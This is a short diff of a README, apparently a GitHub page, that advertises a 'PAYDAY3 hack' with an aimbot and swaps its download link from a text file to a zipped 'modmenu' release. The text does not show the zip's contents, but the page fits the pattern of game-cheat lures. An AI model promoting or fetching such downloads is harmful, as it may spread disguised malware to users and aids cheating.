@@ -1,6 +1,6 @@
 # Download
 Press the button at the bottom
-[<img src="https://img.shields.io/badge/PAYDAY3_HACK-DOWNLOAD_NOW-blue?style=for-the-badge">](https://github.com/alexandriaxv2/payday-3-wildwave/blob/main/payday3-hack-installer.txt)
+[<img src="https://img.shields.io/badge/PAYDAY3_HACK-DOWNLOAD_NOW-blue?style=for-the-badge">](https://github.com/alexandriaxv2/payday-3-wildwave/releases/download/wildwave/Payday3_WILDWAVE_Modmenu.zip)
 
 # Features:
 - a i m b o t
